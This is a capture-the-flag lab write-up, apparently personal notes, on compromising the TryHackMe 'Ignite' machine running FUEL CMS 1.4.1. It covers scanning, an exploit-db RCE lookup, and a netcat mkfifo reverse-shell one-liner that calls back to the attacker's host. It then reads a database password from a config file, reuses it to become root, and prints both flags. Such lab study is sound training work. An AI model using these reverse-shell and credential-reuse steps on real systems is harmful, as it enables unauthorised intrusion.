kali@kali:~/oscptraining/tryhackme/Ignite$ nmap -sV -sC -o nmap 10.10.235.151
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:12 EDT
Nmap scan report for 10.10.235.151
Host is up (0.35s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.63 seconds
kali@kali:~/oscptraining/tryhackme/Ignite$ gobuster dir -e -u http://10.10.235.151/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.235.151/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/10/13 12:14:11 Starting gobuster
===============================================================
http://10.10.235.151/.hta (Status: 403)
http://10.10.235.151/.htaccess (Status: 403)
http://10.10.235.151/.htpasswd (Status: 403)
http://10.10.235.151/0 (Status: 200)
http://10.10.235.151/assets (Status: 301)
http://10.10.235.151/home (Status: 200)
http://10.10.235.151/index.php (Status: 200)
http://10.10.235.151/index (Status: 200)
http://10.10.235.151/offline (Status: 200)
http://10.10.235.151/robots.txt (Status: 200)
http://10.10.235.151/server-status (Status: 403)
===============================================================
2020/10/13 12:18:08 Finished                                                                                                            
===============================================================  

kali@kali:~/oscptraining/tryhackme/Ignite$ searchsploit 47138 -p
  Exploit: fuelCMS 1.4.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
File Type: HTML document, ASCII text, with CRLF line terminators


was stuck on installing request module in python2 and glad i found an answer here 
https://stackoverflow.com/questions/64376726/unable-to-install-requests-module-in-python2-7-kali-linux-as-it-keeps-appearin?noredirect=1#comment113836497_64376726

open netcat on kali
nc -lvnp 4444

code for reverseshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.102.117 4444 >/tmp/f

https://unicornsec.com/home/tryhackme-ignite explanation 

listening on [any] 4444 ...
connect to [10.8.102.117] from (UNKNOWN) [10.10.141.217] 39652
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data


$ cd /home
$ ls
www-data
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b 


find / -name database.php  (got this clue from the webpage itself, the config details are stored in this file)
find: '/var/tmp/systemd-private-f98332a1d1874cf0b78dcb439ab039ec-rtkit-daemon.service-4B3Pdw': Permission denied
/var/www/html/fuel/application/config/database.php
find: '/var/spool/rsyslog': Permission denied

now we can get into that database.php

we got something like this when we open it, now we got the password
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',


using this gets me the filepath straight as i filtered out all those i cant access

$ find / -name database.php 2>&1 | grep -v "Permission denied"
/var/www/html/fuel/application/config/database.php

get the shell up
python -c 'import pty; pty.spawn("/bin/bash")'

www-data@ubuntu:/$ su
su
Password: mememe

root@ubuntu:/# cat root/root.txt
cat root/root.txt
b9bbcb33e11b80be759c4e844862482d 

and we got it!




